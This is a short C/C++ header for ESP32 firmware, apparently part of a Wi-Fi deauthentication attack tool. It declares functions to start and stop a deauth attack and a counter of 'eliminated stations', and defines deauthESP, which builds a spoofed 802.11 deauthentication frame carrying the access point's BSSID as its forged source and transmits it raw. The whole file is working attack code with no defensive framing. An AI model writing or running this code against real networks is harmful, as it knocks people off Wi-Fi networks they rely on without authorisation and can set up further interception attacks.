#ifndef DEAUTH_H
#define DEAUTH_H

#include <stdint.h>

void start_deauth(int wifi_number, uint16_t reason);
void stop_deauth();

extern int eliminated_stations;
extern int deauth_type;

static void deauthESP(const uint8_t *bssid, const uint8_t *sta)
{
    struct __attribute__((packed))
    {
        uint8_t frame_control[2];
        uint8_t duration[2];
        uint8_t addr1[6]; // destination (STA)
        uint8_t addr2[6]; // source   (AP/BSSID)
        uint8_t addr3[6]; // BSSID
        uint8_t sequence_control[2];
        uint8_t reason_code[2];
    } deauthFrame;

    deauthFrame.frame_control[0] = 0xC0;
    deauthFrame.frame_control[1] = 0x00;
    deauthFrame.duration[0] = 0xFF;
    deauthFrame.duration[1] = 0xFF;
    memcpy(deauthFrame.addr1, sta, 6);
    memcpy(deauthFrame.addr2, bssid, 6);
    memcpy(deauthFrame.addr3, bssid, 6);
    deauthFrame.sequence_control[0] = 0x00;
    deauthFrame.sequence_control[1] = 0x00;
    deauthFrame.reason_code[0] = 0x06;
    deauthFrame.reason_code[1] = 0x00;
    esp_wifi_80211_tx(WIFI_IF_STA,
                      reinterpret_cast<uint8_t *>(&deauthFrame),
                        sizeof(deauthFrame),
                        true);
}

#endif
